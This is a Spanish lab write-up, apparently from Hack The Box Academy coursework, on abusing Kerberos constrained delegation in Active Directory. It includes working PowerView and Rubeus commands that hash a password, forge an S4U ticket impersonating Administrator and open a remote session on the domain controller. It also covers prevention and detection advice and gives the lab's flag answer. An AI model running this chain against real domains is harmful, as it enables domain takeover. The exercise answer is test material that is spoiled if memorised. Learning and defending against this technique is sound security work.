# Kerberos Constrained Delegation

# **Descripción**

`Kerberos Delegation`permite que una aplicación acceda a recursos alojados en un servidor diferente; Por ejemplo, en lugar de dar a la cuenta de servicio que ejecuta el acceso del servidor web a la base de datos directamente, podemos permitir que la cuenta se delegue al servicio SQL Server. Una vez que un usuario inicia sesión en el sitio web, la cuenta de servicio del servidor web solicitará acceso al servicio de servidor SQL en nombre de ese usuario, lo que permite al usuario obtener acceso al contenido en la base de datos a la que ha sido provisto sin tener que asignar Cualquier acceso a la cuenta de servicio del servidor web en sí.

Podemos configurar tres tipos de delegaciones en Active Directory:

- `Unconstrained Delegation`(más permisivo/amplio)
- `Constrained Delegation`
- `Resource-based Delegation`

Saber y comprender que`any`El tipo de delegación es un posible riesgo de seguridad es primordial, y debemos evitarlo a menos que sea necesario.

Como su nombre indica,`unconstrained delegation`es el más permiso, que permite que una cuenta delega a cualquier servicio. En`constrained delegation`, una cuenta de usuario tendrá sus propiedades configuradas para especificar qué servicios pueden delegar. Para`resource-based delegation`, la configuración está dentro del objeto de la computadora a quien ocurre la delegación. En ese caso, la computadora está configurada como`I trust only this/these accounts`. Es raro ver`Resource-based delegation`Configurado por un administrador en entornos de producción (los agentes de amenazas a menudo abusan de dispositivos de compromiso). Sin embargo,`Unconstrained`y`Constrained`Las delegaciones se encuentran comúnmente en entornos de producción.

---

# **Ataque**

Solo mostraremos el abuso de`constrained delegation`; Cuando se confía en una cuenta para la delegación, la cuenta envía una solicitud al`KDC`Afirmar: "Dame un boleto de Kerberos para el usuario yyyy porque me confiaré para delegar a este usuario para dar servicio a zzzz", y se genera un boleto de Kerberos para el usuario yyy (sin proporcionar la contraseña del usuario yyyy). También es posible delegar a otro servicio, incluso si no está configurado en las propiedades del usuario. Por ejemplo, si se nos confía en delegar para`LDAP`, podemos realizar la transición del protocolo y ser confiados a cualquier otro servicio, como`CIFS`o`HTTP`.

Para demostrar el ataque, asumimos que el usuario`web_service`se confía en la delegación y se ha visto comprometido. La contraseña de esta cuenta es`Slavi123`. Para comenzar, usaremos el`Get-NetUser`función de[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)para enumerar las cuentas de los usuarios que se confían en la delegación restringida en el dominio:

Nota: a lo largo del ejercicio, utilice el`PowerView-main.ps1`ubicado en`C:\Users\bob\Downloads`Al enumerar con el`-TrustedToAuth`parámetro.

Delegación restringida de Kerberos

```powershell
PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth

logoncount                    : 23
badpasswordtime               : 12/31/1601 4:00:00 PM
distinguishedname             : CN=web service,CN=Users,DC=eagle,DC=local
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : web service
lastlogontimestamp            : 10/13/2022 2:12:22 PM
userprincipalname             : webservice@eagle.local
name                          : web service
objectsid                     : S-1-5-21-1518138621-4282902758-752445584-2110
samaccountname                : webservice
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 10/13/2022 9:53:09 PM
instancetype                  : 4
usncreated                    : 135866
objectguid                    : b89f0cea-4c1a-4e92-ac42-f70b5ec432ff
lastlogoff                    : 1/1/1600 12:00:00 AM
msds-allowedtodelegateto      : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local, http/DC1,
                                http/DC1.eagle.local/EAGLE...}
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=eagle,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {cvs/dc1.eagle.local, cvs/dc1}
givenname                     : web service
lastlogon                     : 10/14/2022 2:31:39 PM
badpwdcount                   : 0
cn                            : web service
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 10/13/2022 8:32:35 PM
primarygroupid                : 513
pwdlastset                    : 10/13/2022 10:36:04 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 143463

```

![](https://academy.hackthebox.com/storage/modules/176/A9/ConsDelegation.png)

Podemos ver que el usuario`web_service`está configurado para delegar el servicio HTTP al controlador de dominio`DC1`. El servicio HTTP proporciona la capacidad de ejecutar`PowerShell Remoting`. Por lo tanto, cualquier actor de amenaza que obtenga control sobre`web_service`puede solicitar un boleto de Kerberos para cualquier usuario en Active Directory y usarlo para conectarse a`DC1`encima`PowerShell Remoting`.

Antes de solicitar un boleto con`Rubeus`(que espera un hash de contraseña en lugar de ClearText para el`/rc4`Argumento utilizado posteriormente), debemos usarlo para convertir la contraseña de texto sin formato`Slavi123`en su`NTLM`hash equivalente:

Delegación restringida de Kerberos

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:Slavi123

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Calculate Password Hash(es)

[*] Input password             : Slavi123
[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!

```

![](https://academy.hackthebox.com/storage/modules/176/A9/phash.png)

Entonces, usaremos`Rubeus`Para obtener un boleto para el`Administrator`cuenta:

Delegación restringida de Kerberos

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: S4U

[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
[*] Building AS-REQ (w/ preauth) for: 'eagle.local\webservice'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFiDCCBYSgAwIBBaEDAgEWooIEnjCCBJphggSWMIIEkqADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtlYWdsZS5sb2NhbKOCBFgwggRUoAMCARKhAwIBAqKCBEYEggRCI1ghAg72
      moqMS1skuua6aCpknKibZJ6VEsXfyTZgO5IKRDnYHnTJT6hwywSoXpcxbFDDlakB56re10E6f6H9u5Aq
	  ...
	  ...
	  ...
[+] Ticket successfully imported!

```

![](https://academy.hackthebox.com/storage/modules/176/A9/getTicket.png)

Para confirmar que`Rubeus`inyectado el boleto en la sesión actual, podemos usar el`klist`dominio:

Delegación restringida de Kerberos

```powershell
PS C:\Users\bob\Downloads> klist

Current LogonId is 0:0x88721

Cached Tickets: (1)

#0>     Client: Administrator @ EAGLE.LOCAL        Server: http/dc1 @ EAGLE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 10/13/2022 14:56:07 (local)
        End Time:   10/14/2022 0:56:07 (local)
        Renew Time: 10/20/2022 14:56:07 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```

![](https://academy.hackthebox.com/storage/modules/176/A9/klistdelegated.png)

Con el boleto disponible, podemos conectarnos al controlador de dominio que se hace pasar por la cuenta`Administrator`:

Delegación restringida de Kerberos

```powershell
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> hostname
DC1
[dc1]: PS C:\Users\Administrator\Documents> whoami
eagle\administrator
[dc1]: PS C:\Users\Administrator\Documents>

```

![](https://academy.hackthebox.com/storage/modules/176/A9/pssession.png)

Si el último paso falla (es posible que necesitemos hacer`klist purge`, Obtenga nuevos boletos e intente nuevamente reiniciando la máquina). También podemos solicitar boletos para múltiples servicios con el`/altservice`argumento, como`LDAP`, `CFIS`, `time`, y`host`.

---

# **Prevención**

Afortunadamente, al diseñar la delegación de Kerberos, Microsoft implementó varios mecanismos de protección; Sin embargo, no los habilitó de forma predeterminada a ninguna cuenta de usuario. Hay dos formas directas de evitar que se emita un boleto para un usuario a través de la delegación:

- Configurar la propiedad`Account is sensitive and cannot be delegated`Para todos los usuarios privilegiados.
- Agregar usuarios privilegiados al`Protected Users`Grupo: esta membresía aplica automáticamente la protección mencionada anteriormente (sin embargo, no se recomienda usarla`Protected Users`sin comprender primero sus posibles implicaciones).

Debemos tratar cualquier cuenta configurada para la delegación como extremadamente privilegiado, independientemente de sus privilegios reales (como ser solo un usuario de dominio). Las contraseñas criptográficamente seguras son imprescindibles, como no queremos`Kerberoasting`Dar a los agentes de amenaza una cuenta con privilegios de delegación.

---

# **Detección**

Correllar el comportamiento de los usuarios es la mejor técnica para detectar`constrained delegation`abuso. Supongamos que conocemos la ubicación y el tiempo que un usuario usa regularmente para iniciar sesión. En ese caso, será fácil alertar sobre otros comportamientos (sospechosos), por ejemplo, considere la cuenta 'Administrador' en el ataque descrito anteriormente. Si una organización madura utiliza estaciones de trabajo de acceso privilegiado (PAWS), debe estar alerta a cualquier usuario privilegiado que no se autentique desde esas máquinas, monitoreando de manera proactiva los eventos con la ID`4624`(inicio de sesión exitoso).

En algunas ocasiones, un intento exitoso de inicio de sesión con un boleto delegado contendrá información sobre el emisor del boleto bajo el`Transited Services`Atributo en el registro de eventos. Este atributo normalmente está poblado si el inicio de sesión resultó de un`S4U` (`Service For User`) Proceso de inicio de sesión.

S4U es una extensión de Microsoft al Protocolo Kerberos que permite que un servicio de aplicación obtenga un boleto de servicio Kerberos en nombre de un usuario; Si recordamos por el flujo de ataque al utilizar`Rubeus`, especificamos esto`S4U`extensión. Aquí hay un evento de inicio de sesión de ejemplo mediante el uso del servicio web para generar un ticket para el administrador del usuario, que luego se utilizó para conectarse al controlador de dominio (precisamente como la ruta de ataque anterior):

![](https://academy.hackthebox.com/storage/modules/176/A9/detect1.png)

## **Preguntas y respuestas**

1) Use las técnicas que se muestran en esta sección para obtener acceso al controlador del dominio DC1 y enviar el contenido del archivo flag.txt.

Primero, importe el módulo y ejecute la función Get-Netuser.

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FuHjRzknD4VWYMMZQMYL4%252FScreenshot%2813%29.png%3Falt%3Dmedia%26token%3D6a969f43-5d5d-420b-a1d5-41de2033ec42&width=768&dpr=4&quality=100&sign=c45a50f0&sv=2)

Podemos ver que el usuario web_service está configurado para delegar el servicio HTTP al controlador de dominio DC1.

Dado que sabemos que la contraseña del usuario de Web_Service es SLAVI123, usemos Rubeus para convertir la contraseña de texto sin formato a un hash NTLM.

Copiar

```
.\Rubeus.exe hash /password:Slavi123
```

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FlVrUCBGsdiGxXdpUsVlW%252FScreenshot%2814%29.png%3Falt%3Dmedia%26token%3De86666e6-9846-4d7d-b4e4-62a7e57caca2&width=768&dpr=4&quality=100&sign=f80e5d82&sv=2)

Entonces, usaremos`Rubeus`Para obtener un boleto para el`Administrator`cuenta:

Copiar

```
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /pt
```

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FznxVIRn91M0ImrSV299h%252FScreenshot%2815%29.png%3Falt%3Dmedia%26token%3Dae0df3de-841f-452f-8491-b413cf2352f2&width=768&dpr=4&quality=100&sign=de5f2ab6&sv=2)

Ahora conectemos al controlador de dominio que se hace pasar por la cuenta`Administrator`

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FoPmFwoskQ4v6NA98v2PW%252FScreenshot%2816%29.png%3Falt%3Dmedia%26token%3D52576b5e-e259-4b0e-9f3a-ceb6e4caba89&width=768&dpr=4&quality=100&sign=ff61823c&sv=2)

Respuesta: c0nstr@in3d_f1@g_dc01!